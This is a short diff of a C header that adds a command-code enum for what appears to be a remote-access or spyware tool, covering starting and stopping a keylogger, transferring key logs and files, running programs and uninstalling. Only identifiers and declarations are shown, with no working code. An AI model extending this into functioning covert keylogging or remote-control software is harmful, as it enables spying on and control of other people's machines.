@@ -3,6 +3,19 @@
 
 #include "utils.h"
 
+enum command_codes {
+    START_KEYLOGGER,
+    STOP_KEYLOGGER,
+    KEY_LOG_TRANSFER,
+    SEND_FILE,
+    RECEIVE_FILE,
+    SEND_WATCH,
+    WATCH_CHANGED,
+    RUN_PROGRAM,
+    UNINSTALL,
+    DISCONNECT
+};
+
 // Keylogger
 void send_start_keylogger(int fd);
 void send_stop_keylogger(int fd);
